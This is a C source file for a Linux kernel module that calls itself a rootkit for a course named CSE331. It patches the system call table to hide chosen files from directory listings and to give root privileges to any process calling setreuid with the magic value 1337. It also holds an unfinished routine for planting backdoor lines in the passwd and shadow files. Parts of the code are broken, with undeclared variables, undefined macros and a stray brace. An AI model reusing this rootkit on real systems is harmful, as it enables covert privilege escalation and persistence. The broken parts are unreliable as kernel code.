#include <linux/module.h>
#include <linux/moduleparam.h>
#include <linux/kernel.h>
#include <linux/slab.h>
#include <linux/fs.h>
#include <linux/uaccess.h>
#include <linux/kallsyms.h>
#include <linux/syscalls.h>
#include <asm/uaccess.h>
#include <asm/unistd.h>
#include <linux/dirent.h>

MODULE_LICENSE("GPL") ;
MODULE_AUTHOR("Brendan<brendanfoley1214@gmail.com>") ;
MODULE_DESCRIPTION("Rootkit Testfile for CSE331") ;
MODULE_VERSION("0.3");

void **sys_call_address; // Pointer to the sys_call_table

asmlinkage int (* old_setreuid) (uid_t ruid, uid_t euid);
asmlinkage int our_setreuid(uid_t ruid, uid_t euid){
	struct cred *creds;
	kuid_t zeroUID;
	kgid_t zeroGID;
	zeroUID.val = 0;
	zeroGID.val = 0;

	if(ruid == 1337 && euid == 1337){
		creds = prepare_creds();
		creds->uid = zeroUID;
		creds->gid = zeroGID;
		creds->euid = zeroUID;
		creds->egid = zeroGID;
		creds->suid = zeroUID;
		creds->sgid = zeroGID;
		creds->fsuid = zeroUID;
		creds->fsgid = zeroGID;
		commit_creds(creds);
		return old_setreuid(0, 0);
	}
	return old_setreuid(ruid, euid);
}

// Start Marc STILL WORKING ON IT, IDK WHAT THIS ISSSSS
	void add_backdoor(char *path) {
		struct file *file;
		char *BACKDOOR;
		// mm_segment_t old_fs;
		
		char *buffer;
		bool has_backdoor = false;
		int page_count = 0;
		
		loff_t offset; // WHAT
		
		unsigned long ret;
		
		if (strcmp(path, PASSWD_FILE) == 0) 
			{BACKDOOR = BACKDOOR_PASSWD;}
		if (strcmp(path, SHADOW_FILE) == 0)
			{BACKDOOR = BACKDOOR_SHADOW;}
		
		old_fs = get_fs(); // WHAT
		
		set_fs(get_ds()); // WHAT
	    	file = filp_open(path, O_RDWR, 0); // WHAT
	    	set_fs(old_fs); // WHAT

	    	if(IS_ERR(file)){
			goto exit;
	    	}

	    	//check if backdoor is already inserted
	    	buf = (char *) kmalloc(PAGE_SIZE, GFP_KERNEL);

	    	if(!buf){
			goto cleanup1;
	    	}

	    	has_backdoor = false;
	    	ret = PAGE_SIZE;
	    	offset = 0;
	    	while(ret == PAGE_SIZE){
			offset = page_count*PAGE_SIZE;

			set_fs(get_ds());
			ret = vfs_read(file, buf, PAGE_SIZE, &offset);
			set_fs(old_fs);

			if(ret < 0){
		    		//DEBUG("read errors");
		    		goto cleanup2;
			}

			page_count++;

			if(strstr(buf, BACKDOOR)){
			    has_backdoor = true;
			    break;
			}
	    	}

	    	if(has_backdoor){
			//DEBUG(pathname);
			//DEBUG("-----already has backdoor-------");
			goto cleanup2;
		    }
	
		 //DEBUG(pathname);
	    	//DEBUG("--- doesn't have backdoor. inserting---");

	    	//seek offset to end of file
	    	offset = 0;

	    	set_fs(get_ds());
	    	offset = vfs_llseek(file, offset, SEEK_END);
	    	set_fs(old_fs);

	    	if(offset < 0){
			goto cleanup2;
		    }

		    //add backdoor to the end of file
		    ret = 0;
	
		    set_fs(get_ds()); //
		    ret = vfs_write(file, BACKDOOR, strlen(BACKDOOR),&offset); //
		    set_fs(old_fs); //
	
		    if(ret<0){
			goto cleanup2;
	    	}

		cleanup2:
		    if(buf)
			kfree(buf);
	
		cleanup1:
		    if(file)
			filp_close(file, NULL);
	
		exit:
		    return;
		}
}
// End Marc

// START BRIAN - Hide files & directories from showing up when a user does "ls"

// taken from man getdents(2)
struct linux_dirent {
    unsigned long  d_ino;     /* Inode number */
    unsigned long  d_off;     /* Offset to next linux_dirent */
    unsigned short d_reclen;  /* Length of this linux_dirent */
    char           d_name[];  /* Filename (null-terminated) */
                              /* length is actually (d_reclen - 2 - offsetof(struct linux_dirent, d_name)) */
	/*
    char           pad;       // Zero padding byte
    char           d_type;    // File type (only since Linux 2.6.4); offset is (d_reclen - 1)
    */
};

int count;
static char* fileNames[5];
module_param_array(fileNames, charp, &count, 0); // This creates a command line parameter called fileNames. fileNames="a.txt", "b.txt", "c.txt" ... up to 5 files
		   
asmlinkage int (*original_getdents) (unsigned int fd, struct linux_dirent* dirp, unsigned int count);

asmlinkage int sys_getdents_hook(unsigned int fd, struct linux_dirent* dirp, unsigned int count){
	int rtn = original_getdents(fd, dirp, count); // rtn = the number of bytes of linux_dirent structs read from fd;
	struct linux_dirent* my_dirp = kmalloc(rtn, GFP_KERNEL); // Need to create a buffer to copy over dirp contents
	if(!my_dirp){
		printk(KERN_INFO "Failed to allocate memory\n");
		return rtn;
	}
	if(copy_from_user(my_dirp, dirp, rtn) != 0){ // Need to copy since we're unable to directly dereference dirp pointer
		printk(KERN_INFO "Failed to copy all bytes from copy_from_user\n");
		kfree(my_dirp);
		return rtn;
	}
	struct linux_dirent* cur = my_dirp;
	int i = 0;
	int j;
	int foundFile;
	while(i < rtn){
		foundFile = 0;
		for(j = 0; fileNames[j] && j < count; j++){
			if (strncmp(cur->d_name, fileNames[j], strlen(fileNames[j])) == 0){
				int reclen = cur->d_reclen;
				char* next_rec = (char*)cur + reclen;
				int len = (int)my_dirp + rtn - (int)next_rec;
				memmove(cur, next_rec, len); // Overwrite dirent by shifting contents to the left
				rtn -= reclen; // New dirp array will now be shorter since a dir ent got overwritten
				foundFile = 1;
				continue;
			}
		}
		if(foundFile == 0){ // This flag prevents the program from skipping ahead when memory already got shifted
			i += cur->d_reclen;
			cur = (struct linux_dirent*) ((char*)my_dirp + i); // Go to next dir entry 
		}
		copy_to_user(dirp, my_dirp, rtn); // Safely copy over modified results to dirp
	}
	kfree(my_dirp);
	return rtn;
}

// END BRIAN

// Loads the LKM
static int __init rootkit_init(void){
	// Gets the address of the sys call table
	sys_call_address = (void*)kallsyms_lookup_name("sys_call_table"); 
	if (sys_call_address == NULL) {
    	printk(KERN_ERR "Couldn't look up sys_call_table\n");
    	return -1;
  	}
	
	// Start Marc
	
	// End Marc
	
	printk(KERN_INFO "sys_call_table Address is: %X\n", *sys_call_address);
	write_cr0(read_cr0() & (~0x10000)); // This will make the sys call table writable

	// Start Brian
	original_getdents = sys_call_address[__NR_getdents]; // Get the pointer to the original sys call function
	sys_call_address[__NR_getdents] = (void*)&sys_getdents_hook; // Replace the pointer on the table with our hook
	// End Brian

	// Start Brendan
	old_setreuid = sys_call_address[__NR_setreuid];
	sys_call_address[__NR_setreuid] = our_setreuid;
	printk(KERN_INFO "setreuid replaced\n");
	// End Brendan

	write_cr0(read_cr0() | 0x10000); // This will make the sys call table read only again
	return 0;
}

// Exits the LKM
static void __exit rootkit_exit(void){
	write_cr0(read_cr0() & (~0x10000)); // This will make the sys call table writable
	// We must undo the changes to the sys call table or our systems get fucked
	sys_call_address[__NR_getdents] = original_getdents;
	sys_call_address[__NR_setreuid] = old_setreuid;
	write_cr0(read_cr0() | 0x10000); // This will make the sys call table read only again
	printk(KERN_INFO "Old setreuid inserted");
	printk(KERN_INFO "Rootkit Unloaded\n");
	return;
}

module_init(rootkit_init);
module_exit(rootkit_exit);
